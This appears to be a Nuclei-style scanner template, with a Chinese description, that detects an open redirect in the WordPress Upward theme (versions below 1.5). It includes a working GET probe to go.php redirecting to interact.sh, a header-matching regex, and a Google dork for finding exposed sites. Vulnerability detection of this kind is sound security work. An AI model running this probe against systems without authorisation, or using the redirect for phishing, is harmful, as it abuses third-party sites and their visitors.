id: wp-upward-theme-redirect

info:
  name: WordPress Upward Themes <1.5 - 开放重定向漏洞
  author: r3Y3r53
  severity: medium
  description: WordPress Upward Themes <1.5 - 开放重定向 存在开放重定向漏洞。该模板依据实际请求路径、返回特征与命中证据验证目标是否暴露相应漏洞。
  reference:
    - https://cxsecurity.com/issue/WLB-2020030133
  metadata:
    verified: true
    max-request: 1
    google-query: inurl:"/wp-content/themes/Upward/"
  tags: wordpress,wp-theme,wp,upward,redirect,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/themes/Upward/go.php?https://interact.sh"

    matchers:
      - type: regex
        part: header
        regex:
          - '(?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]*)interact\.sh.*$'
